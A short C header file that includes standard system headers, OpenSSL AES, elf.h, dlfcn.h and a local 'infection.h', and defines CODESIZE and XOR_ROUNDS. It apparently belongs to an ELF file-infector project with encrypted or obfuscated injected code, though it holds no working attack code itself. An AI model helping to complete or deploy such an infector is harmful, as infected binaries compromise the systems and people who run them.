#ifndef INCLUDES_H
#define INCLUDES_H



/// INCLUDES 

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dirent.h>
#include <string.h>
#include <time.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <sys/mman.h>
#include <limits.h>
#include <elf.h>
#include <dlfcn.h>
#include "infection.h"


/// DEFINES

#define CODESIZE 2048
#define XOR_ROUNDS 5


#endif  // INCLUDES_H
